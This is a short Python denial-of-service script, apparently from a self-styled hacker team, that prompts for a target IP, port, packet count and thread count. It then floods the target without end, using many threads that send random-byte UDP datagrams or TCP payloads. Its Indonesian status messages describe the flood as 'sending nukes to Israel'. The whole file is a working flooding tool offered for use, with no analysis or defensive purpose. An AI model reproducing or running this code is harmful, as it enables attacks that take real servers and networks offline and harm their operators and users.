#!/usr/bin/env python3
#Author : ArthurXzz
#Scripter :: ArthurXzz
import random
import socket
import threading
import os

os.system("clear")
print("ArthurXzz Team Hacker")
print("Discord.gg/ArthurXzz-Zona")
ip = str(input(" Ip Detroit Target: "))
port = int(input(" Port Detroit Target: "))
choice = str(input(" Nuklir Sudah Di Pasang?(y/n): "))
times = int(input(" Packets Nuklir: "))
threads = int(input(" Threads Nuklir: "))
def run():
  data = random._urandom(54321)
  i = random.choice(("[*]","[!]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
      print(i +" | ArthurXzz Mengirimkan Nuklir Ke Israel|")
    except:
      print("[!] | ArthurXzz Mengirimkan Nuklir Ke Israel!!! |")

def run2():
  data = random._urandom(65543)
  i = random.choice(("[*]","[!]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
      print(i +" ArthurXzz Is King!!!")
    except:
      s.close()
      print("[*] Israel Sudah Rusak Nuklir Kebanyakan")

for y in range(threads):
  if choice == 'y':
    th = threading.Thread(target = run)
    th.start()
  else:
    th = threading.Thread(target = run2)
    th.start()
